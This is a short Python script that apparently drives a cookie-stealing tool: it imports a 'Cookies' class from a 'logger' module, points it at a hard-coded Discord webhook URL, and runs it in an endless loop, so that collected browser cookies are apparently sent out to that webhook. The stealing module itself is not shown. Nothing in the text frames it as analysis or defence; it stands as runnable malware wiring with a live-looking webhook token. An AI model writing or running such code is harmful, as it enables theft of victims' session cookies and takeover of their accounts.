from logger import Cookies

log = Cookies('https://discord.com/api/webhooks/1368122030700101643/4WwzuKpcZYLsdsiYXj790m_MRlR0UDuIes1X5dsRxFhgOGwdXVbB_aqFqLQgLLIuLiho')

def main():
  while True:
	log.run_all()

if __name__ == '__main__':
	main()
